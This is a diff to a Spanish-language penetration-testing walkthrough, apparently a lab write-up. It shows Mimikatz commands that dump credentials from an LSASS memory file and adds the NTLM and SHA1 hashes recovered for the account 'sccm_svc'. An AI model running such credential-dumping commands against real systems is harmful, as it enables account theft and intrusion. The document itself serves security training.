@@ -409,4 +409,13 @@ C:\Tools\Mimikatz\x64\mimikatz.exe
 ```
 Utilizaremos los comandos `log`, luego `sekurlsa::minidump C:\Users\jordan\lsass.dmp` y finalmente `sekurlsa::logonpasswords`:
 
+<img width="1026" height="730" alt="imagen" src="https://github.com/user-attachments/assets/f91d9704-8e16-41d9-9756-3d5d05a5bf63" />
+
+Obtuvimos el hash del usuario `sccm_svc`:
+
+- `NTLM` : `64f12cddaa88057e06a81b54e73b949b`
+- `SHA1` : `cba4e545b7ec918129725154b29f055e4cd5aea8`
+
+
+
 ---
